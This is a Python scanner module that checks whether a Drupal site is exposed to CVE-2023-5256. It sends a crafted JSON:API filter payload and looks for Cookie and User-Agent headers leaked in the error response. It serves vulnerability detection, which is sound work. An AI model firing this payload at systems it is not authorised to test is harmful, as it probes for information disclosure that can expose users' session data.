#!/usr/bin/env python3

"""
https://github.com/elttam/publications/blob/master/writeups/CVE-2023-5256.md
"""

from utils.style import Colors, Identify
from utils.utils import configure_logger, requests

logger = configure_logger(__name__)


def drupaljsonapi(url: str, headers: dict) -> None:
    payload = "/jsonapi/user/user?filter[a-labex][condition][path]=cachingyourcookie"
    uri = f"{url}{payload}"
    try:
        req = requests.get(
            uri, headers=headers, verify=False, timeout=10, allow_redirects=False
        )
        if (
            req.status_code not in [200, 301, 302, 307, 308, 401, 403, 404]
            and "jsonapi" in req.text
        ):
            if "Cookie" in req.text and "User-Agent" in req.text:
                print(
                    f" {Identify.confirmed} | CVE-2023-5256 | {Colors.BLUE}{uri}{Colors.RESET} | {req.status_code} | require manual check"
                )
            else:
                print(
                    f" {Identify.behavior} | CVE-2023-5256 | {Colors.BLUE}{uri}{Colors.RESET} | {req.status_code}"
                )
    except requests.Timeout as t:
        logger.error(f"request timeout {uri}", t)
    except Exception as e:
        logger.exception(f"request error {uri}", e)
